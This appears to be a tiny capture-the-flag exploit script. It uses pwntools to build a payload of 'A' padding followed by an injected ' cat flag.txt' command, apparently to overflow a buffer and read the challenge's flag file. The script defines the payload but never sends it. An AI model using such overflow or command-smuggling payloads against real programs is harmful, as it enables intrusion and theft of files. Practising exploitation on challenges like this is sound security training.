#!/usr/bin/env python3

import pwn


payload = ([
    b'A'*11,
    b'A'*299,
    b' cat flag.txt',
])
